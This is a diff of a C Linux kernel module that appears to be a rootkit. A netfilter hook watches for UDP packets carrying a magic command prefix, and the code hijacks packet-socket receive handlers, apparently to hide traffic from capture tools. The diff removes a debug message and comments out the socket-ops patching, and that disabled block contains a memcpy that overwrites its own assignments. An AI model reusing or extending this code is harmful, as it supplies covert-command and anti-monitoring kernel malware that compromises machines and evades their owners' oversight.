@@ -224,7 +224,6 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     user_data_len = get_udp_user_data(skb, &user_data);
 
     if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
-    printk(KERN_INFO "Found %s cmd packet!\n", command_work->cmd->name);
     user_data += CMD_MAGIC_LEN;
     user_data_len -= CMD_MAGIC_LEN;
 
@@ -306,16 +305,16 @@ int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void
     struct socket *sock = (struct socket *)wq_entry->private;
     struct packet_sock *po = pkt_sk(sock->sk);
     if (!strcmp(sock->sk->__sk_common.skc_prot->name, "PACKET")) {
-        if (original_packet_ops == NULL || sock->ops == original_packet_ops) {
-            printk(KERN_INFO "patching socket ops!\n");
-            original_packet_ops = sock->ops;
-            new_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
-            new_ops->poll = new_packet_poll;
-            new_ops->recvmsg = new_packet_recvmsg;
-            new_ops->mmap = new_packet_mmap;
-            memcpy(new_ops, original_packet_ops, sizeof(struct proto_ops));
-            sock->ops = new_ops;
-        }
+        // if (original_packet_ops == NULL || sock->ops == original_packet_ops) {
+        //     printk(KERN_INFO "patching socket ops!\n");
+        //     original_packet_ops = sock->ops;
+        //     new_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
+        //     new_ops->poll = new_packet_poll;
+        //     new_ops->recvmsg = new_packet_recvmsg;
+        //     new_ops->mmap = new_packet_mmap;
+        //     memcpy(new_ops, original_packet_ops, sizeof(struct proto_ops));
+        //     sock->ops = new_ops;
+        // }
         if (original_packet_rcv == NULL || po->prot_hook.func == original_packet_rcv) {
             printk(KERN_INFO "patching socker packet rcv!\n");
             original_packet_rcv = po->prot_hook.func;
